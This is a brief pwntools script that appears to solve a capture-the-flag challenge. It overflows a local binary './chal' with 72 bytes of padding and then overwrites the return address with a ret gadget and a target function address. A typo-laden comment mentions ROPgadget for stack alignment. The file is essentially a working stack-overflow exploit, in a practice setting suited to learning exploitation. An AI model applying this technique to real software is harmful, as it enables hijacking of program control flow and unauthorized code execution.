from pwn import *

p = process('./chal')

p.sendline(b'a'*72 +p64(0x000000000040101a)+ p64(0x0000000000401216))

p.interactive()

# for 65 bits we need a retrurn adress  "ROPgadget --binary ./file" will five us one
